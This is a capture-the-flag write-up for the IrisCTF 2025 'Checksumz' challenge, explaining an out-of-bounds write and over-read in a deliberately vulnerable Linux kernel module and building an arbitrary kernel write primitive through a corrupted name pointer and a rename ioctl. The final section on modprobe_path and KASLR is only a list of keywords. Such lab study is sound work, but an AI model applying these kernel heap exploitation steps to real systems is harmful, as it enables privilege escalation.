+++
title = 'IrisCTF 2025 - Checksumz'
date = 2025-01-14T14:14:52-03:00
tags = ['exploitation', 'linux_kernel']
+++

# Problem statement

```goat
 "Someone told me that I can write faster programs by putting them into kernel
modules, so I replaced my checksum function with a char device." 
```

We're given a nicely setup environment with a vulnerable kernel module.

Below this the main struct with holds the driver's state per file descriptor.

```c
struct checksum_buffer {
	loff_t pos;
	char state[512];
	size_t size;
	size_t read;
	char* name;
	uint32_t s1;
	uint32_t s2;
};
```

It gets initialized in the `open` handler, note the `kzalloc` and pay attention
to the size of each allocation.

SLUB is the default allocator for most Linux systems and we know that it
allocates blocks in fixed sizes and the page frames are separate[1]. So,
`kmalloc-128` is used to allocations like 100 bytes, `kmalloc-256` for 200
bytes, etc.

```c
static int checksumz_open(struct inode *inode, struct file *file) {
	file->private_data = kzalloc(sizeof(struct checksum_buffer), GFP_KERNEL);
	struct checksum_buffer* buffer = (struct checksum_buffer*) file->private_data;

    // ...

	buffer->name = kzalloc(1000, GFP_KERNEL);

    // ...

	return 0;
}
```

In this case, since the allocations are above 512 and below 1024 bytes, they'll
get allocated in `kmalloc-1024`.

# Buffer overflow

Below are the `lseek` and `write` handlers. Note that the overflow happens
because we can set the `buffer->pos` to the end of the buffer, and during the
write, it'll overflow.

```c
static loff_t checksumz_llseek(struct file *file, loff_t offset, int whence) {
	struct checksum_buffer* buffer = file->private_data;

	switch (whence) {
		case SEEK_SET:
			buffer->pos = offset;
			break;
            // ...
	}

	if (buffer->pos < 0)
		buffer->pos = 0;

	if (buffer->pos >= buffer->size) // size is 256
		buffer->pos = buffer->size - 1; // so we can set it to 255

	return buffer->pos;
}

// ...

static ssize_t checksumz_write_iter(struct kiocb *iocb, struct iov_iter *from) {
    struct checksum_buffer* buffer = iocb->ki_filp->private_data;
    size_t bytes = iov_iter_count(from);

    if (!buffer)
        return -EBADFD;
    if (!bytes)
        return 0;

    ssize_t copied = copy_from_iter(buffer->state + buffer->pos, min(bytes, 16), from); // we can start write from 255 to 255 + 16

    buffer->pos += copied;
    if (buffer->pos >= buffer->size)
        buffer->pos = buffer->size - 1;
    
    return copied;
}
```

And there is also a `read` that overflows, it leaks **256** bytes instead of **16**.

```c
static ssize_t checksumz_read_iter(struct kiocb *iocb, struct iov_iter *to) {
// ...
    ssize_t copied = copy_to_iter(buffer->state + buffer->pos, min(bytes, 256), to);
// ...
    return copied;
}
```

# hands on

Let's test our assumptions debugging the kernel with driver.
In the CTF challenge files we have symbols, so setting a breakpoint is as easy
as `b *(checksumz_write_iter+113)`.

And to trigger the breakpoint we can `open` the file descriptor and `write` to it:


```c
// ...
    int fd = open("/dev/checksumz", O_RDWR);
    ssize_t written_bytes = write(fd, &data, sizeof(data));
// ...
```

In gdb when the breakpoint is triggered, let's inspect the `checksum_buffer`:
object:

```bash
pwndbg> p/x $rbx
$5 = 0xff11000004a50800

pwndbg> p/x *((struct checksum_buffer*)$rbx)
$1 = {
  pos = 0x1ff,
  state = {0x0 <repeats 512 times>},
  size = 0x100,
  read = 0x0,
  name = 0xff11000004a51400,
  s1 = 0x1,
  s2 = 0x0
}

pwndbg> p/x ((struct checksum_buffer*)$rbx)->name-$rbx
$8 = 0xc00
pwndbg> p 0xc00/0x400
$9 = 3
```

Both heap allocations we discussed before are 1024 (0x400 in hex) aligned, i.e.
their addresses are multiples of 0x400. We can also see that both allocations
are close, just **0x400 * 3** bytes apart.

# unlocking abilities (getting a better primitive)

The first we're going to do is to override that `size` variable withthe
overflow we have in the `state` buffer, since they're next to each other we
just need to `lseek` to the end of `state` and then write a big value for `size`.

Now that we are no longer constrained by 16 bytes right after `state`, we can
also override the `name` string pointer. This is going to be very useful since
we can use the `rename` `ioctl` to write to that pointer 48 bytes.

```c
static long checksumz_ioctl(struct file *file, unsigned int command, unsigned long arg) {
	struct checksum_buffer* buffer = file->private_data;

	if (!file->private_data)
		return -EBADFD;
	
	switch (command) {
        // ...
		case CHECKSUMZ_IOCTL_RENAME:
			char __user *user_name_buf = (char __user*) arg;

			if (copy_from_user(buffer->name, user_name_buf, 48)) {
				return -EFAULT;
			}
        // ...
```


By overwriting the value in the `name` pointer and calling the `rename` `ioctl`
we have an arbitrary write anywhere in the kernel :)

```c
void arb_write(int fd, uint64_t addr, uint64_t* data) {
    lseek(fd, 0x210, addr);
    write(fd, &addr, sizeof(addr));

    if (ioctl(fd, CHECKSUMZ_IOCTL_RENAME, data) < 0) {
        perror("ioctl - CHECKSUMZ_IOCTL_RENAME");
    }
}
```

# Heap magic


`modprobe_path`, `KASLR`, `kmalloc-1024`


# References


- [1] - https://pawnyable.cafe/linux-kernel/ 
- [2] - https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628
